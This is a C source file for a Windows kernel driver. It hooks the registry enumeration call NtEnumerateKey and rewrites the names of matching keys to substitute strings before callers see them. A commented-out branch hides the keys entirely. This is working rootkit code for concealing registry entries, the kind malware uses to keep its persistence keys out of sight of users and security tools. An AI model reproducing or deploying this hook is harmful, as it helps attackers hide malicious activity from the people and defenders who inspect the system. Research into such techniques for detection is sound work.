#include "key.h"

ULONG StrLenghtW(PWCHAR wstr) {
	ULONG i = 0;
	while (wstr[i++] != L'\0');
	return i;
}

NTSTATUS NTAPI HookNtEnumerateKey(
	HANDLE                KeyHandle,
	ULONG                 Index,
	KEY_INFORMATION_CLASS KeyInformationClass,
	PVOID                 KeyInformation,
	ULONG                 Length,
	PULONG                ResultLength
) {
	NTSTATUS retStatus;


	retStatus = glRealNtEnumerateKey(KeyHandle,
		Index,
		KeyInformationClass,
		KeyInformation,
		Length,
		ResultLength);

	if (NT_SUCCESS(retStatus)) {
		if (*ResultLength != 0) {
			__try {
				ChangeKey(KeyInformationClass, KeyInformation);
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				DbgPrint("\n\nEXCEPTION KEY\n\n");
			}
		}
	}

	return retStatus;
}

VOID ChangeKey(KEY_INFORMATION_CLASS KeyInformationClass, PVOID KeyInformation) {
	if (KeyInformationClass == KeyBasicInformation) {
		PKEY_BASIC_INFORMATION pbi = (PKEY_BASIC_INFORMATION)KeyInformation;
		if (pbi) {
			if (pbi->NameLength != 0 && pbi->Name != NULL) {
				PLIST_ENTRY pLink;

				//UNICODE_STRING unName;
				//PWCHAR name = ExAllocatePoolWithTag(NonPagedPool, pbi->NameLength + sizeof(WCHAR), 'oneN');
				//RtlZeroMemory(name, pbi->NameLength + sizeof(WCHAR));
				//RtlCopyMemory(name, pbi->Name, pbi->NameLength);
				//RtlInitUnicodeString(&unName, name);
				//KdPrint(("KeyBasicInformation %ws\n", unName.Buffer));

				for (pLink = glTaskQueueKey.Flink; pLink != &glTaskQueueKey; pLink = pLink->Flink) {
					PTASK_QUEUE_KEY task = CONTAINING_RECORD(pLink, TASK_QUEUE_KEY, link);
					if (!wcsncmp(pbi->Name, task->target, pbi->NameLength / sizeof(WCHAR))) {
						
						// RENAME KEY
						ULONG lenChange = StrLenghtW(task->change);
						RtlZeroMemory(pbi->Name, pbi->NameLength);
						RtlCopyMemory(pbi->Name, task->change, lenChange * sizeof(WCHAR));
						pbi->NameLength = lenChange * sizeof(WCHAR);

						// HIDE KEY
						//RtlZeroMemory(pbi->Name, pbi->NameLength);
						//pbi->NameLength = 0;
						break;
					}
				}
			}
		}
	}
	else if (KeyInformationClass == KeyNodeInformation) {
		PKEY_NODE_INFORMATION pni = (PKEY_NODE_INFORMATION)KeyInformation;
		if (pni) {
			if (pni->NameLength != 0 && pni->Name != NULL) {
				PLIST_ENTRY pLink;

				//UNICODE_STRING unName;
				//PWCHAR name = ExAllocatePoolWithTag(NonPagedPool, pni->NameLength + sizeof(WCHAR), 'oneN');
				//RtlZeroMemory(name, pni->NameLength + sizeof(WCHAR));
				//RtlCopyMemory(name, pni->Name, pni->NameLength);
				//RtlInitUnicodeString(&unName, name);
				//KdPrint(("KeyNodeInformation %ws\n", unName.Buffer));

				for (pLink = glTaskQueueKey.Flink; pLink != &glTaskQueueKey; pLink = pLink->Flink) {
					PTASK_QUEUE_KEY task = CONTAINING_RECORD(pLink, TASK_QUEUE_KEY, link);
					if (!wcsncmp(pni->Name, task->target, pni->NameLength / sizeof(WCHAR))) {

						// RENAME KEY
						ULONG lenChange = StrLenghtW(task->change);
						RtlZeroMemory(pni->Name, pni->NameLength);
						RtlCopyMemory(pni->Name, task->change, lenChange * sizeof(WCHAR));
						pni->NameLength = lenChange * sizeof(WCHAR);

						// HIDE KEY
						//RtlZeroMemory(pni->Name, pni->NameLength);
						//pni->NameLength = 0;
						break;
					}
				}
			}
		}
	}
	else if (KeyInformationClass == KeyNameInformation) {
		//PKEY_NAME_INFORMATION pni = (PKEY_NAME_INFORMATION)KeyInformation;
		//UNICODE_STRING unName;
		//PWCHAR name = ExAllocatePoolWithTag(NonPagedPool, pni->NameLength + sizeof(WCHAR), 'oneN');
		//RtlZeroMemory(name, pni->NameLength + 2);
		//RtlCopyMemory(name, pni->Name, pni->NameLength);
		//RtlInitUnicodeString(&unName, name);
		//KdPrint(("KeyNameInformation %ws\n", unName.Buffer));
	}
	else if (KeyInformationClass == KeyFullInformation) {
		//KdPrint(("KeyFullInformation\n"));
	}
	else if (KeyInformationClass == KeyCachedInformation) {
		//KdPrint(("KeyCachedInformation\n"));
	}
}

PWCH AnsiToUnicodeKey(char* str) {

	ANSI_STRING ansiStr;
	UNICODE_STRING uniStr;
	USHORT length;

	RtlInitAnsiString(&ansiStr, str);
	length = (USHORT)RtlAnsiStringToUnicodeSize(&ansiStr);
	uniStr.Buffer = (PWCH)ExAllocatePoolWithTag(PagedPool, length, 'oneN');
	uniStr.MaximumLength = length;
	RtlAnsiStringToUnicodeString(&uniStr, &ansiStr, FALSE);
	
	return uniStr.Buffer;
}

VOID TaskQueueByKey(PCHAR target, PCHAR change) {

	if (target != NULL && change != NULL) {
		PTASK_QUEUE_KEY task = (PTASK_QUEUE_KEY)ExAllocateFromPagedLookasideList(&glPagedTaskQueueKey);

		task->target = AnsiToUnicodeKey(target);
		task->change = AnsiToUnicodeKey(change);

		InsertTailList(&glTaskQueueKey, &task->link);
	}

}

VOID FreeTaskQueueKeyList() {

	while (!IsListEmpty(&glTaskQueueKey)) {
		PLIST_ENTRY pLink = RemoveHeadList(&glTaskQueueKey);
		PTASK_QUEUE_KEY task = CONTAINING_RECORD(pLink, TASK_QUEUE_KEY, link);
		if (task->target) ExFreePool(task->target);
		if (task->change) ExFreePool(task->change);
		ExFreeToPagedLookasideList(&glPagedTaskQueueKey, task);
	}

}


VOID PrintTaskQueueKeyList() {
	PLIST_ENTRY pLink;
	DbgPrint("TASK QUEUE FOR ADD KEY\n");
	for (pLink = glTaskQueueKey.Flink; pLink != &glTaskQueueKey; pLink = pLink->Flink) {
		PTASK_QUEUE_KEY task = CONTAINING_RECORD(pLink, TASK_QUEUE_KEY, link);

		if (task->target) {
			DbgPrint("TARGET:%ws\t", (PCHAR)task->target);
		}
		if (task->change) {
			DbgPrint("CHANGE:%ws\n", (PCHAR)task->change);
		}
	}
}